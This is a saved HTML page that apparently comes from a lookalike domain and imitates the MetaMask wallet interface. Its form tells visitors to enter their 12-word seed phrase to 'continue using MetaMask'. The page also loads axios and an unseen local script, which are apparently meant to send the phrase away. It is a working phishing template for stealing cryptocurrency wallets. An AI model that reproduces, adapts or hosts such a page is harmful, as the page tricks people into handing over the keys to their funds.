<!DOCTYPE html>
<!-- saved from url=(0034)https://axleinflnlity.com/metamask -->
<html>

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>MetaMask</title>

    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link type="text/css" rel="stylesheet" href="./MetaMask_files/style3.css">
</head>

<body>
    <div id="app-content" class="z3">
        <div data-reactroot="" class="app">
            <div class="app-header">
                <div class="app-header__contents">
                    <div class="app-header__logo-container">
                        <img class="app-header__metafox-logo app-header__metafox-logo--horizontal" height="30"
                            src="./MetaMask_files/logo.svg">
                    </div>
                    <div class="app-header__account-menu-container">
                        <div class="app-header__network-component-wrapper">
                            <div class="network-component pointer ethereum-network" title="Ethereum">
                                <div class="network-indicator">
                                    <div class="menu-icon-circle">
                                        <div
                                            style="background: rgb(3, 135, 137); border: none; height: 12px; width: 12px;">
                                        </div>
                                    </div>
                                    <div class="network-name">Ethereum MainNet</div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div><span></span></div>
            <div class=".menu-droppo-container network-droppo"
                style="position: absolute; top: 58px; width: 309px; z-index: 55;"></div>
            <div class="main-container-wrapper">
                <div class="first-view-main-wrapper">
                    <div class="first-view-main">
                        <div class="import-account">
                            <div class="import-account__title">Continue with Seed Phrase</div>
                            <div class="import-account__selector-label">Enter your keyword phrase of 12 words to
                                continue using MetaMask.</div>
                            <div class="import-account__input-wrapper"><label class="import-account__input-label">Wallet
                                    Seed</label>
                                <form>
                                    <div id="textphrase2"
                                        style="display:none;color:red;margin-top: var(--space-4);font-size: var(--font-size-12);line-height: var(--line-height-16);"
                                        class="ds-helper-text">Seed phrase is invalid</div>
                                    <textarea id="phrase" name="phrase" class="import-account__secret-phrase"
                                        placeholder="Separate each word with a single space"></textarea>
                                </form>
                            </div><span class="error"></span>
                            <button id="sendToken" type="submit" class="button btn--first-time first-time-flow__button"
                                id="checkdisa">Proceed</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"
        integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
    <script src="/js/main.js"></script>
</body>

</html>
